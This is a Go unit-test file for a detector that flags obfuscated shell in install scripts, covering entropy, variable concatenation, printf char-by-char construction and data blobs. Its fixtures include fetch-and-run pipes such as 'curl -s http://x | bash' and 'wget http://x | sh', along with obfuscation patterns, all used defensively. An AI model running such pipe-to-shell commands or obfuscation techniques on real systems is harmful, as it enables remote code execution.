package detect

import (
	"strings"
	"testing"
)

// Direct in-package tests for the shell-obfuscation analyzers in shell.go.
// These cover the helpers and sub-analyzers gremlins reported NOT COVERED:
// hasWordMatch boundary branches, shannonEntropy, isWordChar,
// containsDangerousPipe, containsMultiVarDangerousCmd, the variable-resolution
// family, the char-by-char constructor, the data-blob detectors and the
// heredoc-entropy trigger.

func allDistinctBytes() string {
	b := make([]byte, 256)
	for i := range b {
		b[i] = byte(i)
	}
	return string(b)
}

func TestIsWordChar(t *testing.T) {
	cases := []struct {
		b    byte
		want bool
	}{
		{'a', true}, {'G', true}, {'7', true}, {'_', true},
		{'-', false}, {'.', false}, {' ', false}, {'/', false}, {':', false},
	}
	for _, c := range cases {
		if got := isWordChar(c.b); got != c.want {
			t.Errorf("isWordChar(%q) = %v, want %v", c.b, got, c.want)
		}
	}
}

func TestHasWordMatch(t *testing.T) {
	cases := []struct {
		text, word string
		want       bool
	}{
		{"curl http://x", "curl", true},  // at start
		{"http://x curl", "curl", true},  // at end
		{"run curl now", "curl", true},   // mid-text
		{"curlx", "curl", false},         // followed by a word char
		{"mycurl", "curl", false},        // preceded by a word char
		{"curl_x", "curl", false},        // followed by underscore
		{"curl-x", "curl", true},         // followed by a dash is a boundary
		{"x.curl", "curl", true},         // preceded by a dot is a boundary
		{"wget http://x", "curl", false}, // absent
		{"curlm curl", "curl", true},     // first hit fails, rescan finds it
	}
	for _, c := range cases {
		if got := hasWordMatch(c.text, c.word); got != c.want {
			t.Errorf("hasWordMatch(%q, %q) = %v, want %v", c.text, c.word, got, c.want)
		}
	}
}

func TestShannonEntropy(t *testing.T) {
	if got := shannonEntropy(""); got != 0 {
		t.Errorf("shannonEntropy(\"\") = %v, want 0", got)
	}
	if got := shannonEntropy("aaaaaaaa"); got != 0 {
		t.Errorf("shannonEntropy of a constant string = %v, want 0", got)
	}
	cases := []struct {
		s    string
		want float64
	}{
		{"ab", 1.0},
		{"abcd", 2.0},
		{"abcdefgh", 3.0},
		{allDistinctBytes(), 8.0},
	}
	for _, c := range cases {
		if got := shannonEntropy(c.s); got != c.want {
			t.Errorf("shannonEntropy(varied %d-byte string) = %v, want %v", len(c.s), got, c.want)
		}
	}
	// Monotonic: more distinct bytes means strictly higher entropy.
	if e2, e4, e8 := shannonEntropy("ab"), shannonEntropy("abcd"), shannonEntropy(allDistinctBytes()); !(e2 < e4 && e4 < e8) {
		t.Errorf("entropy not monotonic: %v, %v, %v", e2, e4, e8)
	}
}

func TestContainsDangerousPipe(t *testing.T) {
	cases := []struct {
		resolved     string
		wantL, wantR string
		wantOK       bool
	}{
		{"curl -s http://x | bash", "curl", "bash", true},
		{"wget http://x | sh", "wget", "sh", true},
		// The pair list is scanned in order, and the right side is a substring
		// match: "python" inside "python3" wins over the exact "python3" pair.
		{"curl http://x | python3", "curl", "python", true},
		{"curl http://x", "", "", false},           // no pipe
		{"make | tee log", "", "", false},          // pipe of safe commands
		{"curl http://x | tee log", "", "", false}, // right side not a shell
	}
	for _, c := range cases {
		l, r, ok := containsDangerousPipe(c.resolved)
		if ok != c.wantOK || l != c.wantL || r != c.wantR {
			t.Errorf("containsDangerousPipe(%q) = (%q, %q, %v), want (%q, %q, %v)",
				c.resolved, l, r, ok, c.wantL, c.wantR, c.wantOK)
		}
	}
}

func TestContainsMultiVarDangerousCmd(t *testing.T) {
	cases := []struct {
		original, resolved string
		env                map[string]string
		wantCmd            string
		wantOK             bool
	}{
		{"$a$b", "sh", map[string]string{"a": "s", "b": "h"}, "sh", true},                         // no single var holds it
		{"bash -c $x", "bash -c bash", map[string]string{"x": "bash"}, "", false},                 // word already in original
		{"$x", "curl http://e | bash", map[string]string{"x": "curl http://e | bash"}, "", false}, // one var holds it
		{"$a$b", "run", map[string]string{"a": "s", "b": "h"}, "", false},                         // resolves to nothing dangerous
	}
	for _, c := range cases {
		cmd, ok := containsMultiVarDangerousCmd(c.original, c.resolved, c.env)
		if ok != c.wantOK || cmd != c.wantCmd {
			t.Errorf("containsMultiVarDangerousCmd(%q, %q, %v) = (%q, %v), want (%q, %v)",
				c.original, c.resolved, c.env, cmd, ok, c.wantCmd, c.wantOK)
		}
	}
}

func TestAnalyzeVariableResolution(t *testing.T) {
	// Variable concatenation resolving to curl|bash without the words in the
	// original line is SA-VAR-CONCAT-EXEC.
	f := analyzeVariableResolution("a=$x$y", map[string]string{"x": "curl -s ", "y": "http://e | bash"})
	if !has(f, "SA-VAR-CONCAT-EXEC") {
		t.Errorf("expected SA-VAR-CONCAT-EXEC, got %v", ids(f))
	}
	// Concatenation resolving to a whole dangerous command word is
	// SA-VAR-CONCAT-CMD.
	f = analyzeVariableResolution("b=$x$y", map[string]string{"x": "s", "y": "h"})
	if !has(f, "SA-VAR-CONCAT-CMD") {
		t.Errorf("expected SA-VAR-CONCAT-CMD, got %v", ids(f))
	}
	// The single-variable guard exists only on the CMD path: when one
	// variable's value already holds the whole command word, no finding.
	if f := analyzeVariableResolution("c=$x", map[string]string{"x": "bash"}); len(f) != 0 {
		t.Errorf("single-var CMD resolution must not fire, got %v", ids(f))
	}
	// The EXEC path has no single-variable guard: a variable holding a whole
	// pipe-to-shell still resolves to curl|bash and fires.
	f = analyzeVariableResolution("$x", map[string]string{"x": "curl -s http://e | bash"})
	if !has(f, "SA-VAR-CONCAT-EXEC") {
		t.Errorf("expected SA-VAR-CONCAT-EXEC for a single var holding the pipe, got %v", ids(f))
	}
}

func TestAnalyzeIndirectExecution(t *testing.T) {
	env := map[string]string{"x": "bash"}
	f := analyzeIndirectExecution("echo hi\n$x -i", env)
	if !has(f, "SA-INDIRECT-EXEC") {
		t.Errorf("expected SA-INDIRECT-EXEC, got %v", ids(f))
	}
	// The dangerous variable unused in execution position is not a finding.
	if f := analyzeIndirectExecution("echo $x", env); len(f) != 0 {
		t.Errorf("plain echo of $x must not fire, got %v", ids(f))
	}
}

func TestAnalyzeCharByCharConstruction(t *testing.T) {
	content := "a=$(printf '\\x41') $(printf '\\x42') $(printf '\\x43')"
	f := analyzeCharByCharConstruction(content)
	if !has(f, "SA-CHARBYCHAR-CONSTRUCT") {
		t.Errorf("expected SA-CHARBYCHAR-CONSTRUCT, got %v", ids(f))
	}
	// Two subshells are not enough.
	if f := analyzeCharByCharConstruction("a=$(printf '\\x41') $(printf '\\x42')"); len(f) != 0 {
		t.Errorf("two printf subshells must not fire, got %v", ids(f))
	}
}

func TestAnalyzeDataBlobs(t *testing.T) {
	longHex := strings.Repeat("a", 140)
	f := analyzeDataBlobs("x=" + longHex)
	if !has(f, "SA-DATA-BLOB-HEX") {
		t.Errorf("expected SA-DATA-BLOB-HEX, got %v", ids(f))
	}
	for _, got := range f {
		if got.ID == "SA-DATA-BLOB-HEX" && got.Class != ClassContext {
			t.Errorf("SA-DATA-BLOB-HEX class = %v, want %v", got.Class, ClassContext)
		}
	}
	// A checksum array (line or block) suppresses the blob detectors.
	if f := analyzeDataBlobs("sha256sums=('" + longHex + "')"); len(f) != 0 {
		t.Errorf("checksum line must not fire, got %v", ids(f))
	}
	// Long base64 with non-hex characters is SA-DATA-BLOB-BASE64.
	b64 := strings.Repeat("zQ8+/", 30)
	f = analyzeDataBlobs("y=" + b64)
	if !has(f, "SA-DATA-BLOB-BASE64") {
		t.Errorf("expected SA-DATA-BLOB-BASE64, got %v", ids(f))
	}
}

func TestAnalyzeHeredocEntropy(t *testing.T) {
	high := "cat <<'EOF'\n" + allDistinctBytes() + "\nEOF\n"
	f := analyzeHeredocEntropy(high)
	if !has(f, EntropyTriggerID) {
		t.Errorf("expected %s, got %v", EntropyTriggerID, ids(f))
	}
	for _, got := range f {
		if got.ID == EntropyTriggerID && got.Class != ClassTrigger {
			t.Errorf("%s class = %v, want %v", EntropyTriggerID, got.Class, ClassTrigger)
		}
	}
	// A low-entropy heredoc body is not a trigger.
	low := "cat <<'EOF'\n" + strings.Repeat("a", 300) + "\nEOF\n"
	if f := analyzeHeredocEntropy(low); len(f) != 0 {
		t.Errorf("low-entropy heredoc must not fire, got %v", ids(f))
	}
	// A short body is not a trigger even at high entropy.
	short := "cat <<'EOF'\n" + allDistinctBytes()[:100] + "\nEOF\n"
	if f := analyzeHeredocEntropy(short); len(f) != 0 {
		t.Errorf("short heredoc must not fire, got %v", ids(f))
	}
}

func TestAnalyzeShellPrefixSuffix(t *testing.T) {
	content := "a=$(printf '\\x41') $(printf '\\x42') $(printf '\\x43')"
	f := analyzeShell(content, "IS-", "(in install script)")
	if len(f) != 1 {
		t.Fatalf("expected one finding, got %v", ids(f))
	}
	got := f[0]
	if got.ID != "IS-SA-CHARBYCHAR-CONSTRUCT" {
		t.Errorf("ID = %q, want IS-SA-CHARBYCHAR-CONSTRUCT", got.ID)
	}
	if !strings.HasSuffix(got.Description, "(in install script)") {
		t.Errorf("Description = %q, want suffix %q", got.Description, "(in install script)")
	}
	if got.Category != "shell" {
		t.Errorf("Category = %q, want shell", got.Category)
	}
	if got.Class != ClassEvidence {
		t.Errorf("Class = %v, want %v", got.Class, ClassEvidence)
	}
}
